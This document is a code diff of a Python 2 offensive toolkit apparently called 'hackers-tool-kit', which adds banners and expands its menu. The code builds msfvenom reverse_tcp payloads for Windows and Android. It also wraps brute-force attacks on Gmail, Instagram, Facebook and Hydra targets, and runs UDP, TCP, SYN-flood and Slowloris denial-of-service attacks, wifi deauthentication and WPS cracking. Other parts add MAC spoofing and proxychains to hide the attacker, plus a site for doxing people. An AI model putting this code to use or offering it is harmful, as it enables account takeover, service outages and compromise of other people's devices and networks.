+   \033[31m▄█    █▄\033[0m     |  |//|     \033[32m▄█   ▄█▄\033[0m 
+  ███    ███    |  |//|    ███ ▄███▀ 
+  ███    ███    |  |//|    ███▐██▀   
+  ███▄▄▄▄███    |  |//|    █████▀    
+  ███▀▀▀▀███    |  |//|    █████▄    
+  ███    ███    |  |//|    ███▐██▄   
+  ███    ███    |  |.-|    ███ ▀███▄ 
+  \033[31m███    ███\033[0m    |.-'**|    \033[32m███   ▀█▀\033[0m 
+                 \***/               
+                  \*\033[91m/\033[31m
+                   V\033[0m
+	""".decode('utf-8')
+def mainbanner18():
+	print """
+                             Type \033[31m?\033[0m For\033[31m Help\033[0m
+\033[31m╔═══╗           ╔═══╗    ╔═════════════════════╗    ╔═══╗     ╔═══╗
+║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║    ║\033[0mHTKHTKHTKHTKHTKHTKHTK\033[31m║    ║\033[0mHTK\033[31m║    ╔╝\033[0mHTK\033[31m║
+║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║    ║\033[0mHTKHTKHTKHTKHTKHTKHTK\033[31m║    ║\033[0mHTK\033[31m║  ╔═╝\033[0mHTK\033[31m╔╝
+║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║    ╚════════╗\033[0mHTK\033[31m╔════════╝    ║\033[0mHTK\033[31m║ ╔╝\033[0mHTK\033[31m╔═╝
+║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m║╔╝\033[0mHTK\033[31m╔╝
+║\033[0mHTK\033[31m╚═══════════╝\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m╚╝\033[0mHTK\033[31m╔╝
+║\033[0mHTKHHHHHHHHHHHHHHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTK HTK\033[31m╔╝
+║\033[0mHTKTTTTTTTTTTTTTHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTKHTK \033[31m╚╗\033[0m
+║\033[31mHTKKKKKKKKKKKKKKHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m╔╗\033[31mHTK\033[0m╚═╗
+║\033[31mHTK\033[0m╔═══════════╗\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║╚═╗\033[31mHTK\033[0m╚╗
+║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║  ╚╗\033[31mHTK\033[0m╚╗
+║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║   ╚╗\033[31mHTK\033[0m╚╗
+║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║    ╚╗\033[31mHTK\033[0m╚╗
+║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║     ╚╗\033[31mHTK\033[0m║
+╚═══╝           ╚═══╝             ╚═══╝             ╚═══╝      ╚═══╝
+	""".decode('utf-8')
+def mainbanner19():
+	print """\033[31m
+        #                               #        
+        #                               #        
+       %#         \033[0m@tuf_unkn0wn\033[31m          ##       
+      ,%/                               /%,      
+      %##                               ##%      
+      &%##                             ##%&      
+      ,%%#####/.                 ,/#####%%,      
+       %&%%#####/     \033[0m████\033[31m      /#####%%&%       
+        .&&%%%&&      \033[0m████\033[31m       &&%%%&&.        
+           /&%(       \033[0m████\033[31m        (%&(                                           
+                      \033[0m████
+                      ████
+                      ████
+                      ████
+                      ████
+                      ████
+                      ████
+                      ████
+                      ████
+                      ████        
+                      ████
+                      ████
+                      ████   
+                      ████
+                      ████
+ \033[31m██████\033[31m       type    \033[0m█\033[31m??\033[0m█   \033[31mfor help     ██████
+██       \033[0m██████████████████████████████\033[31m  ██
+███████  \033[0m██████████████████████████████\033[31m  ███████
+██    ██              \033[0m████             \033[31m  ██    ██
+ ██████               \033[0m████             \033[31m   ██████
+ ▒ ▓▒ ▒                                   ▒ ▓▒ ▒
+ ░ ▒  ░              ██████               ░ ▒  ░
+   ░  ░             ██                      ░  ░
+                    ███████
+                    ██    ██
+                     ██████
+                     ▒ ▓▒ ▒ 
+                     ░ ▒  ░ 
+                       ░  ░\033[0m  
+	""".decode('utf-8')
+def mainbanner20():
+	print """
+
+
+  ██╗\033[31m██╗  ██╗\033[0m██╗    ██╗\033[92m████████╗\033[0m██╗    ██╗\033[34m██╗  ██╗\033[0m██╗  
+ ██╔╝\033[31m██║  \033[31m██║\033[0m╚██╗  ██╔╝\033[92m╚══\033[92m██╔══╝\033[0m╚██╗  ██╔╝\033[34m██║ ██╔╝\033[0m╚██╗ 
+██╔╝ \033[31m███████║ \033[0m╚██╗██╔╝\033[92m    ██║    \033[0m╚██╗██╔╝\033[34m █████╔╝  \033[0m╚██╗
+╚██╗ \033[31m██╔══██║ \033[0m██╔╝╚██╗    \033[92m██║ \033[0m   ██╔╝╚██╗\033[34m ██╔═██╗\033[0m  ██╔╝
+ ╚██╗\033[31m██║  ██║\033[0m██╔╝  ╚██╗\033[92m   ██║ \033[0m  ██╔╝  ╚██╗\033[34m██║  ██╗\033[0m██╔╝ 
+  ╚═╝\033[31m╚═╝  ╚═╝\033[0m╚═╝    ╚═╝\033[92m   ╚═╝  \033[0m ╚═╝    ╚═╝\033[34m╚═╝  ╚═╝\033[0m╚═╝  
+  Created by @tuf_unkn0wn             type ? for help                                                 
+
+	""".decode('utf-8')
+def mainbanner21():
+	os.system("cat /root/hackers-tool-kit/tools/venombanner.txt")
+
+def mainbanner22():
+	print """{0}
+
+  ██     ██        ██         ██   ███ 
+   ██    ███    █████████    ███ ▄█ █▀ 
+  ███    ███       ███       ███▐██▀   
+  ███▄▄▄▄███        ██{1}    █████▀    
+  ██ ▀▀▀▀███       ███        ████▄    
+  ███    ███       ███       ███▐██▄   
+  ███    ██        ██        ██  ▀█ █▄ 
+ {2} ███    ███        █        ███   ███ 
+                                       
+	""".decode('utf-8').format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
+
+
+def mainbanner():
+	import random
+	for x in range(10):
+	  num = random.randint(1,22)
+	if num == 1:
+		mainbanner1()
+	if num == 2:
+		mainbanner2()
+	if num == 3:
+		mainbanner3()
+	if num == 4:
+		mainbanner4()
+	if num == 5:
+		mainbanner5()
+	if num == 6:
+		mainbanner6()
+	if num == 7:
+		mainbanner7()
+	if num == 8:
+		mainbanner8()
+	if num == 9:
+		mainbanner9()
+	if num == 10:
+		mainbanner10()
+	if num == 11:
+		mainbanner11()
+	if num == 12:
+		mainbanner12()
+	if num == 13:
+		mainbanner13()
+	if num == 14:
+		mainbanner14()
+	if num == 15:
+		mainbanner15()
+	if num == 16:
+		mainbanner16()
+	if num == 17:
+		mainbanner17()
+	if num == 18:
+		mainbanner18()
+	if num == 19:
+		mainbanner19()
+	if num == 20:
+		mainbanner20()
+	if num == 21:
+		mainbanner21()
+	if num == 22:
+		mainbanner22()
+	
+#--------------------------#
+#MAIN STARTING BANNER END#
+
+
+#HELP BANNER START#
+#-----------------#
 def help():
 			print B+"""
 ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒▓  ▒  ▒ ░    ░▒   ▒  ▒ ░░▒░▒▒▓▒▒░   ▒▓▒▒░  ▒ ░   ░ ▒░   ▒ ▒ 
@@ -179,12 +804,17 @@ def help():
      ░  ░      ░     ░                 ░  ░  ░  ░░   ░   ░   ░                 ░ 
 \033[0m		            ░                                                             
 ?       :	displays this message
-clear   :	clears screen except for banner
+reboot  :	reboot hackers-tool-kit
+update  :	update the hackers-tool-kit
+clear   :	clears screen
+banner  :	clears screen and shows new banner
 exit    :	exits script
 restart :	re run hackers-tool-kit
 rebootl :	reboot whole device
+anon    :	make yourself anonymous [\033[33manon on \033[0m|\033[33m anon off\033[0m]
 winload :	windows reverse_tcp payload
 andload :	android reverse_tcp payload
+connect :	connect to a host
 command :	execute terminal command
 msfcon  :	metasploit console
 set     :	setoolkit console
@@ -197,14 +827,16 @@ medusa  :	Medusa bruteforce
 ipgrab  :	host to ip address
 myip    :	show your ip
 wifite  :	automated wifi hacker 
-reaver  :	reaver automated [ wifi hack ]
+reaver  :	reaver automated [\033[33m wifi hack \033[0m]
+aircrack:	aircrack-ng automated [\033[33m wifi hack \033[0m]
 mon     :	put device in monitor mode
 monoff  :	put device out of monitor mode
 netdev  :	find all devices in your network                       
 scannet :	scan for networks around you                          
 specnet :	scan a specific network                               
-port    :	scan for ports on a host                            
-info    :	info gather on a host [includes port scan]\033[91m            █████████████████████ \033[0m
+port    :	scan for ports on a host  
+specscan:	specific info gather on a host                          
+info    :	info gather on a host [\033[33mincludes port scan\033[0m]\033[91m            █████████████████████ \033[0m
 sysinfo :	info about your system  \033[91m                             ██                   ██\033[0m
 msfex   :	shows all metasploit exploits  \033[91m                     ██                     ██\033[0m
 msfpa   :	shows all metasploit payloads   \033[91m                   ██\033[90m      ██       ██\033[91m      ██\033[0m
@@ -217,23 +849,23 @@ slowl   :	Slow Loris dos                     \033[91m                     █   
 ping    :	pings host                          \033[91m                    █               █\033[0m
 multih  :	start a multi handler               \033[91m                    █               █\033[0m
 cupp    :	make wordlists                                           \/ vvvvvvvvv \/
-vdir    :	view files of a directory
-vpn     :	activate a vpn
+vdir    :	view files of a directory                           
+vpn     :	activate a vpn                              
 vpnoff  :	stop vpn
 pidox   :	dox website
 pingen  :	Generate a routers default pin
 deauth  :	deauth attack / wifi jammer
 macc    :	changes mac address
-macoff  :	returns mac address to normal
-arppois :	ARP poisoning
-sslscan :	ssl scan a host
-payload :	make a metasploit payload of your choice
-crunch  :	Make wordlists
-traff   :	shows your internet traffic
-resa    :	reset account password
-resu    :	reset unix password
-hashid  :	find the type of hash of a hash
-wafwoof :	check a web application for firewall
+macoff  :	returns mac address to normal                           Hackers-Tool-Kit
+arpspoof:	arp spoofing                                                    |
+sslscan :	ssl scan a host                                  ██╗  ██╗   ████████╗   ██╗  ██╗
+payload :	make a metasploit payload of your choice         ██║  ██║   ╚══██╔══╝   ██║ ██╔╝
+crunch  :	Make wordlists                                   ███████║\033[91m█████\033[0m╗██║\033[91m█████\033[0m╗█████╔╝
+traff   :	shows your internet traffic                      ██╔══██║╚════╝██║╚════╝██╔═██╗ 
+resa    :	reset account password                           ██║  ██║      ██║      ██║  ██╗
+resu    :	reset unix password                              ╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝
+hashid  :	find the type of hash of a hash                                 |
+wafwoof :	check a web application for firewall                    Hackers-Tool-Kit
 cloud   :	cloudflare bypass
 brutex  :	auto bruteforce every service of a host
 methelp :	show meterpreter help
@@ -241,8 +873,33 @@ winbyp  :	windows defender bypass
 exploit :	use a metasploit exploit of your choice
 phish   :	phishing automated
 datalist:	list all hosts & services in the database
+msfev   :	shows all metasploit evasions
+upgrade :	fully update your linux os
+nscript :	use a nmap script
+sshver  :	scan for ssh version on a host
+chains  :	browse web anonymous via proxychains [\033[33mproxychains setup required\033[0m]
+mysqlv  :	scan for mysql version on a host
+terminal:	open another new terminal
+source  :	get source code from a website
+dirscan :	web directory scanner / bruteforce
+aserver :	start a apache server
+run	:	run a file 
+phpload :	make a php reverse_tcp payload and start it in a multi handler
+pyload  :	make a python reverse_tcp payload and start it in a multi handler
+foxhis  :	gather firefox history from privileged javascript shell
+rhawk   :	run the RED_HAWK script (\033[33minfo gathering tool\033[0m)
+nano    :	open nano text editor
+compilec:	compile a c file
+dnsspoof:	dns spoofing  [\033[33mtype dnsspoofall to spoof entire subnet\033[0m]
+htk-lite:	run a lighter version of hackers-tool-kit
 \033[91m---------------------------------------------------------------------------------\033[0m
 	"""
+#-----------------#
+#HELP BANNER END#
+
+
+#WINDOWS REVERSE TCP PAYLOAD START#
+#---------------------------------#
 def winload():
 	gw = os.popen("ip -4 route show default").read().split()
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -254,6 +911,12 @@ def winload():
 	na = raw_input("Name of File: ")
 	ak = 'msfvenom -p windows/meterpreter/reverse_tcp LPORT={0} -f exe -o /root/{1}.exe LHOST={2}'.format(pf,na,ipaddr)
 	os.system(ak)
+#-------------------------------#
+#WINDOWS REVERSE TCP PAYLOAD END#
+
+
+#ANDROID REVERSE TCP PAYLOAD START#
+#---------------------------------#
 def andload():
 	gw = os.popen("ip -4 route show default").read().split()
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -265,6 +928,45 @@ def andload():
 	na = raw_input("Name of File: ")
 	ak = 'msfvenom -p android/meterpreter/reverse_tcp LPORT={0} -o /root/{1}.apk LHOST={2}'.format(pf,na,ipaddr)
 	os.system(ak)
+#-------------------------------#
+#ANDROID REVERSE TCP PAYLOAD END#
+
+#ANONYMOUS START#
+#---------------#
+def anonon():
+	print "\033[93m------------------------\033[0m"
+	print "\nSTARTING MACCHANGER\n"
+	print "\033[93m------------------------\033[0m"
+	os.system("iwconfig")
+	k = raw_input("Interface: ")
+	c = 'ifconfig {0} down'.format(k)
+	os.system(c)
+	os.system("macchanger -r " + k)
+	s = 'ifconfig {0} up'.format(k)
+	os.system(s)
+	show = 'macchanger -s {0}'.format(k)
+	os.system(show)
+	os.system('proxychains python htk.py --quickrun')
+
+
+def anonoff():
+	print "\033[93m------------------------\033[0m"
+	print "\nSTOPPING MACCHANGER\n"
+	print "\033[93m------------------------\033[0m"
+	os.system("iwconfig")
+	k = raw_input("Interface: ")
+	c = 'ifconfig {0} down'.format(k)
+	os.system(c)
+	os.system("macchanger -p " + k)
+	s = 'ifconfig {0} up'.format(k)
+	os.system(s)
+	sys.exit()
+	reboot()
+#ANONYMOUS END#
+#-------------#
+
+#GMAIL BRUTEFORCE START#
+#----------------------#
 def gmail():
   #!/usr/bin/python
   '''create by Ha3MrX'''
@@ -340,20 +1042,41 @@ def gmail():
            else:
               print '[!] password not found => ' + password
   login()
+#--------------------#
+#GMAIL BRUTEFORCE END#
+
+#PORT SCAN START#
+#---------------#
 def port():
 	n = raw_input("Enter Target: ")
 	os.system("nmap " + n)
+#-------------#
+#PORT SCAN END#
+
+#INSTAGRAM BRUTEFORCE START#
+#--------------------------#
 def insta():
 	insta = raw_input("USERNAME> ")
 	jl = raw_input("WORDLIST> ")
-	k = raw_input("THREADS> ")
-	ma = 'python /root/hackers-tool-kit/tools/instagram.py {0} {1} {2}'.format(insta,jl,k)
+	print "\033[1m\033[33m\nMODES>: [0] fastest, [1] fast, [2] slow, [3] slowest\033[0m\n"
+	k = raw_input("MODE> ")
+	ma = 'python3 /root/hackers-tool-kit/tools/Instagram/instagram.py {0} {1} -m {2}'.format(insta,jl,k)
 	os.system(ma)
+#------------------------#
+#INSTAGRAM BRUTEFORCE END#
+
+#FACEBOOK BRUTEFORCE START#
+#-------------------------#
 def fb():
 	facebook = raw_input("[EMAIL/ID->]: ")
 	word = raw_input("[WORDLIST->]: ")
 	ks = 'cd /root/hackers-tool-kit/tools && perl fb-brute.pl {0} {1}'.format(facebook,word)
 	os.system(ks)
+#-----------------------#
+#FACEBOOK BRUTEFORCE END#
+
+#HOST TO IP START#
+#----------------#
 def ipgrab():
 	b = raw_input(Y+'Enter Host:\033[0m ')
 	ip = socket.gethostbyname(b)
@@ -361,6 +1084,11 @@ def ipgrab():
 	print N+"Host: ", b
 	print N+"IP: ", ip
 	print G+"------------------------\033[0m"
+#--------------#
+#HOST TO IP END#
+
+#YOUR OWN IP START#
+#-----------------#
 def myip():
 	gw = os.popen("ip -4 route show default").read().split()
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -369,14 +1097,42 @@ def myip():
 	gateway = gw[2]
 	host = socket.gethostname()
 	print ("IP: ", ipaddr, " Gateway:", gateway, " Host:", host)
+	print "\n        Router IP"
+	print "----------------------------\033[92m"
+	os.system('curl "http://myexternalip.com/raw"')
+	print "\n\033[0m----------------------------"
+#---------------#
+#YOUR OWN IP END#
+
+
+#AUTOMATED WIFI HACK START#
+#-------------------------#
 def wifite():
 	os.system("wifite")
+#-----------------------#
+#AUTOMATED WIFI HACK END#
+
+
+#MONITOR MODE START#
+#------------------#
 def mon():
 	os.system("iwconfig")
 	i = raw_input("Select Interface: ")
 	os.system("airmon-ng start " + i)
+#----------------#
+#MONITOR MODE END#
+
+
+#DEVICES IN THE NET START#
+#------------------------#
 def netdev():
 	os.system("netdiscover")
+#----------------------#
+#DEVICES IN THE NET END#
+
+
+#NETS AROUND YOU START#
+#-----------------------#
 def scannet():
 	os.system("iwconfig")
 	m = raw_input("Select Interface: ")
@@ -387,6 +1143,12 @@ def scannet():
 		print Y+"! SCAN RESULTS SAVED IN /root/ DIRECTORY !\033[0m"
 	if j == "n":
 		os.system("airodump-ng " + m)
+#---------------------#
+#NETS AROUND YOU END#
+
+
+#INFO SCAN HOST START#
+#--------------------#
 def info():
   params = []
   # Browser
@@ -649,10 +1411,165 @@ def info():
           print url
   except:
       pass
+#------------------#
+#INFO SCAN HOST END#
+
+
+#SPEC INFO SCAN START#
+#--------------------#
+def specscan():
+	print """\033[1m
+Scans Available:\033[0m
+
+1:  simple nmap portscan
+
+2:  show document info of target with curl
+ 
+3:  nmap OS detection, version detection, script scanning, and traceroute scan
+
+4:  nmap dns bruteforce
+
+5:  get a hosts ip address
+
+6:  check if a host is online
+
+7:  who-is lookup
+
+8:  dns-lookup
+
+9:  get a hosts source code
+
+10: web application firewall scanner
+
+11: run a ssl scan
+
+12: find the location of a ip address
+
+13: reverse ip lookup
+
+14: host search
+
+15: reverse dns 
+
+16: find shared dns
+
+17: cloudflare bypass
+
+18: sslscan
+
+19: directory scan / bruteforce
+
+20: nikto scan [this might take awhile to finish]
+
+go back: go back to main menu
+
+	"""
+	print "Type a number then your target   Ex: 5 www.pornhub.com\n"
+	j = False
+	while not j:
+		try:
+			option, target = raw_input("\033[1mScan:\033[0m ").split()
+			if option == "1":
+				os.system("nmap {0}".format(target))
+			if option == "2":
+				os.system("curl -I {0}".format(target))
+			if option == "3":
+				os.system("nmap -A {0}".format(target))
+			if option == "4":
+				os.system("nmap --script dns-brute {0}".format(target))
+			if option == "5":
+				ip = socket.gethostbyname(target)
+				print """
+		Host: {0}
+		IP: {1}
+				""".format(target, ip)
+			if option == "6":
+				ht = raw_input("\033[1mHTTP or HTTPS:\033[0m ")
+				if ht == "https":
+					targetht = "https://"
+				if ht == "http":
+					targetht = "http://"
+				request = requests.get(targetht + target)
+				http = request.status_code
+				if http == 200:
+					print("\nServer: [\033[32monline\033[0m]")
+				else:
+					print("\nServer: [\033[31moffline\033[0m]")
+			if option == "7":
+				whois = requests.get("https://api.hackertarget.com/whois/?q=" + target).content.decode("UTF-8")
+				print(whois)
+			if option == "8":
+				os.system("curl https://api.hackertarget.com/dnslookup/?q={0}".format(target))
+			if option == "9":
+				os.system("curl {0}".format(target))
+			if option == "10":
+				os.system("wafw00f {0}".format(target))
+			if option == "11":
+				os.system("sslscan {0}".format(target))
+			if option == "12":
+				os.system("curl https://api.hackertarget.com/geoip/?q={0}".format(target))
+			if option == "13":
+				os.system("curl https://api.hackertarget.com/reverseiplookup/?q={0}".format(target))
+			if option == "14":
+				os.system("curl https://api.hackertarget.com/hostsearch/?q={0}".format(target))
+			if option == "15":
+				os.system("curl https://api.hackertarget.com/reversedns/?q={0}".format(target))
+			if option == "16":
+				os.system("curl https://api.hackertarget.com/findshareddns/?q={0}".format(target))
+			if option == "17":
+				def daf():
+				     subdomainlist = ["ftp", "cpanel", "webmail", "localhost", "local", "mysql", "forum", "driect-connect", "blog",
+				                         "vb", "forums", "home", "direct", "forums", "mail", "access", "admin", "administrator",
+				                         "email", "downloads", "ssh", "owa", "bbs", "webmin", "paralel", "parallels", "www0", "www",
+				                         "www1", "www2", "www3", "www4", "www5", "shop", "api", "blogs", "test", "mx1", "cdn", "mysql",
+				                         "mail1", "secure", "server", "ns1", "ns2", "smtp", "vpn", "m", "mail2", "postal", "support",
+				                         "web", "dev"]
+				
+				     for sublist in subdomainlist:
+				         try:
+				             hosts = str(sublist) + "." + str(target)
+				             showip = socket.gethostbyname(str(hosts))
+				             print "\033[0m\033[32mHIT\033[0m:\033[1m " + str(showip) + ' | ' + str(hosts)
+				         except:
+				             print "\033[0mBypassing..."
+				
+				daf()
+			if option == "18":
+					a = 'sslscan {0}'.format(target)
+					os.system(a)
+			if option == "19":
+				ht = raw_input("HTTP or HTTPS: ")
+				if ht == "https":
+					targetht = "https://"
+				if ht == "http":
+					targetht = "http://"
+				a = 'dirb {0}{1}/'.format(targetht,target)
+				os.system(a)
+			if option == "20":
+				port = raw_input("\033[1mPort:\033[0m ")
+				os.system("nikto -h {0} -p {1}".format(target,port))
+			if target == "back":
+				break
+		except:
+			print "\n"
+			break
+	j = True
+#------------------#
+#SPEC INFO SCAN END#
+
+
+#INFO ON YOUR SYSTEM START#
+#-------------------------#
 def sysinfo():
-	os.system("ifconfig")
 	os.system("iwconfig")
+	k = raw_input("Interface: ")
+	os.system("clear")
+	os.system("ifconfig")
+	print "\n"
+	os.system("iwconfig")
+	print "\n"
 	os.system("neofetch")
+	print "\n"
 	gw = os.popen("ip -4 route show default").read().split()
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	s.connect((gw[2], 0))
@@ -660,9 +1577,28 @@ def sysinfo():
 	gateway = gw[2]
 	host = socket.gethostname()
 	print (" IP: ", ipaddr, " Gateway: ", gateway, " Host: ", host)
+	print "\n        Router IP"
+	print "----------------------------\033[92m"
+	os.system('curl "http://myexternalip.com/raw"')
+	print "\n\033[0m----------------------------"
+	print "\n"
+	show = 'macchanger -s {0}'.format(k)
+	os.system(show)
+#-----------------------#
+#INFO ON YOUR SYSTEM END#
+
+
+#ALL METASPLOIT EXPLOITS START#
+#-----------------------------#
 def msfex():
 	os.system("service postgresql start")
 	os.system("""msfconsole -x 'show exploits'""")
+#---------------------------#
+#ALL METASPLOIT EXPLOITS END#
+
+
+#UDP DOS START#
+#-------------#
 def udp():
 	target = raw_input(N+"Target:\033[91m ")
 	ip = socket.gethostbyname(target)
@@ -681,9 +1617,24 @@ def udp():
 		print B+"|+| Slapping \033[0m|\033[31m %s \033[0m| Port |\033[31m %s \033[0m| Bytes |\033[31m %s \033[0m|"%(ip,port,sent)
 		if port == 65534:
 			port = 1
+#-----------#
+#UDP DOS END#
+
+#TCP FLOOD START#
+#---------------#
 def tcp():
+	print Y+"-p = port | -t = threads | Example:     tcp 95.52.541.1 -p 80 -t 600\033[0m"
+	print "\n"
 	tcp = raw_input(Y+"[\033[92m+\033[91m-\033[0mTCP\033[91m-\033[92m+\033[93m]\033[0m ")
-	os.system("python " + tcp)
+	print R+"IF YOU GET SPAMMED WITH ERRORS BUT ITS STILL RUNNING ITS FINE\033[0m"
+	os.system("sleep 5")
+	os.system("python /root/hackers-tool-kit/tools/" + tcp)
+#-------------#
+#TCP FLOOD END#
+
+
+#SYN FLOOD START#
+#---------------#
 def syn():
   def randomIP():
     ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
@@ -731,22 +1682,57 @@ def syn():
     SYN_Flood(dstIP,dstPort,int(counter))
 
   main()
+#-------------#
+#SYN FLOOD END#
 
+
+#PING A HOST START#
+#-----------------#
 def ping():
 	p = raw_input("Enter Host: ")
 	os.system("ping " + p)
+#---------------#
+#PING A HOST END#
+
+
+#ALL METASPLOIT PAYLOADS START#
+#-----------------------------#
 def msfpa():
 	os.system("service postgresql start")
 	os.system("""msfconsole -x 'show payloads'""")
+#---------------------------#
+#ALL METASPLOIT PAYLOADS END#
+
+
+#ALL METASPLOIT AUX START#
+#------------------------#
 def msfau():
 	os.system("service postgresql start")
-	os.system("""msfconsole -x 'show auxiliarys'""")
+	os.system("""msfconsole -x 'show auxiliary'""")
+#----------------------#
+#ALL METASPLOIT AUX END#
+
+
+#START METASPLOIT HANDLER START#
+#------------------------------#
 def multih():
 	os.system("service postgresql start")
 	os.system("""msfconsole -x 'use multi/handler'""")
+#----------------------------#
+#START METASPLOIT HANDLER END#
+
+
+#ALL METASPLOIT MODS START#
+#-------------------------#
 def msfall():
 	os.system("service postgresql start")
 	os.sytem("""msfconsole -x 'show all'""")
+#-----------------------#
+#ALL METASPLOIT MODS END#
+
+
+#HYDRA AUTOMATED START#
+#---------------------#
 def hydra():
 	"""
 	This program is just a small program to shorten brute force sessions on hydra :)
@@ -951,9 +1937,21 @@ def hydra():
 		print "\n[!] ERROR : Wrong Input"
 		time.sleep(1)
 	restart_program()
+#-------------------#
+#HYDRA AUTOMATED END#
+
+
+#WORDLIST MAKER START#
+#--------------------#
 def cupp():
 	os.system("cd /root/hackers-tool-kit/wordlists && cupp -i")
 	print Y+"wordlist saved to /root/hackers-tool-kit/wordlists\033[0m"
+#------------------#
+#WORDLIST MAKER END#
+
+
+#LIST FILES START#
+#----------------#
 def vdir():
 	print "\n"
 	os.system("ls")
@@ -964,35 +1962,69 @@ def vdir():
 	print "--------------------------------------------------------------------------------------------------------------------------------------------"
 	os.system("ls " + h)
 	print "--------------------------------------------------------------------------------------------------------------------------------------------"
+#--------------#
+#LIST FILES END#
 
+
+#MONITOR MODE OFF START#
+#----------------------#
 def monoff():
 	os.system("iwconfig")
 	i = raw_input("Select Interface: ")
 	os.system("airmon-ng stop " + i)
+#--------------------#
+#MONITOR MODE OFF END#
+
+
+#TURN ON VPN START#
+#-----------------#
 def vpn():
 	os.system("anonsurf start")
 	os.system("anonsurf myip")
+#---------------#
+#TURN ON VPN END#
+
+
+#TURN OFF VPN START#
+#------------------#
 def vpnoff():
 	os.system("anonsurf stop")
 	os.system("anonsurf myip")
+#----------------#
+#TURN OFF VPN END#
+
+
+#SLOW LORIS DOS START#
+#--------------------#
 def slowl():
 	de = raw_input("Delay: ")
 	tar = raw_input("RHOST: ")
 	port = raw_input("RPORT: ")
 	soc = raw_input("Sockets: ")
-	os.system('echo "use auxiliary/dos/http/slowloris\n" > handler.rc')
-	os.system('echo "set delay {0}\n" >> handler.rc'.format(de))
-	os.system('echo "set RHOST {0}\n" >> handler.rc'.format(tar))
-	os.system('echo "set RPORT {0}\n" >> handler.rc'.format(port))
-	os.system('echo "set sockets {0}\n" >> handler.rc'.format(soc))
-	os.system('echo "run\n" >> handler.rc')
-	os.system('msfconsole -r handler.rc')
-	os.system('rm -rf handler.rc')
+	os.system('echo "use auxiliary/dos/http/slowloris\n" > slowl.rc')
+	os.system('echo "set delay {0}\n" >> slowl.rc'.format(de))
+	os.system('echo "set RHOST {0}\n" >> slowl.rc'.format(tar))
+	os.system('echo "set RPORT {0}\n" >> slowl.rc'.format(port))
+	os.system('echo "set sockets {0}\n" >> slowl.rc'.format(soc))
+	os.system('echo "run\n" >> slowl.rc')
+	os.system('msfconsole -r slowl.rc')
+	os.system('rm -rf slowl.rc')
+#------------------#
+#SLOW LORIS DOS END#
 
+
+#OPEN DOX WEBSITE START#
+#----------------------#
 def pidox():
 	print Y+"! USING FIREFOX !\033[0m"
 	os.system("sleep 2")
 	os.system("firefox https://pipl.com/")
+#--------------------#
+#OPEN DOX WEBSITE END#
+
+
+#SCAN SPECIFIC NET START#
+#-----------------------#
 def specnet():
 	jk = raw_input("BSSID: ")
 	kj = raw_input("ESSID: ")
@@ -1006,16 +2038,34 @@ def specnet():
 	if j == "n":
 		a = 'airodump-ng --bssid {0} --essid {1} {2}'.format(jk,kj,k)
 		os.system(a)
+#---------------------#
+#SCAN SPECIFIC NET END#
+
+
+#DEFAULT WIFI PIN START#
+#----------------------#
 def pingen():
 	j = raw_input("Enter BSSID: ")
 	a = 'cd /root/hackers-tool-kit/tools && python pingen.py {0}'.format(j)
 	os.system(a)
+#--------------------#
+#DEFAULT WIFI PIN END#
+
+
+#WIFI PIN BRUTEFORCE START#
+#-------------------------#
 def reaver():
 	os.system("iwconfig")
 	j = raw_input("Select Interface: ")
 	k = raw_input("Enter BSSID: ")
 	a = 'reaver -i {0} -b {1} -vv'.format(j,k)
 	os.system(a)
+#-----------------------#
+#WIFI PIN BRUTEFORCE END#
+
+
+#DEAUTH ATTACK START#
+#-------------------#
 def deauth():
 	print Y+"! YOU MAY HAVE TO CHANGE YOUR WIFI CHANNEL !\033[0m"
 	j = raw_input("Enter BSSID> ")
@@ -1023,6 +2073,12 @@ def deauth():
 	k = raw_input("Enter Interface> ")
 	a = 'aireplay-ng -0 0 -a {0} {1}'.format(j,k)
 	os.system(a)
+#-----------------#
+#DEAUTH ATTACK END#
+
+
+#MAC CHANGER START#
+#-----------------#
 def macc():
 	os.system("iwconfig")
 	k = raw_input("Interface: ")
@@ -1031,6 +2087,12 @@ def macc():
 	os.system("macchanger -r " + k)
 	s = 'ifconfig {0} up'.format(k)
 	os.system(s)
+#-----------------#
+#MAC CHANGER START#
+
+
+#MAC CHANGER OFF START#
+#---------------------#
 def macoff():
 	os.system("iwconfig")
 	k = raw_input("Interface: ")
@@ -1039,86 +2101,55 @@ def macoff():
 	os.system("macchanger -p " + k)
 	s = 'ifconfig {0} up'.format(k)
 	os.system(s)
-def arppois():
-	 
-	try:
-		os.system("iwconfig")
-		interface = raw_input("[*] Enter Interface: ")
-		victimIP = raw_input("[*] Enter Victim IP: ")
-		gateIP = raw_input("[*] Enter Router IP: ")
-	except KeyboardInterrupt:
-		print "\n[*] User Requested Shutdown"
-		print "[*] Exiting..."
-		os.system("clear")
-		mainbanner()
-	 
-	print "\n[*] Enabling IP Forwarding...\n"
-	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-	 
-	def get_mac(IP):
-		conf.verb = 0
